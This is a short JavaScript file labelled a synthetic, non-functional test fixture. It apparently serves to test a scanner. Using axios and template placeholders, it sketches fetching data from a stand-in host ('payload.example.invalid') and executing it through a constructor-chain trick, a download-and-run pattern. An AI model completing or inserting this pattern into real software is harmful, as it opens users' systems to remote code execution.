// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

{{AXIOS_GET}}("https://payload.example.invalid/f").then((r) => {
  [].{{CTOR_CHAIN}}(r.data)();
});
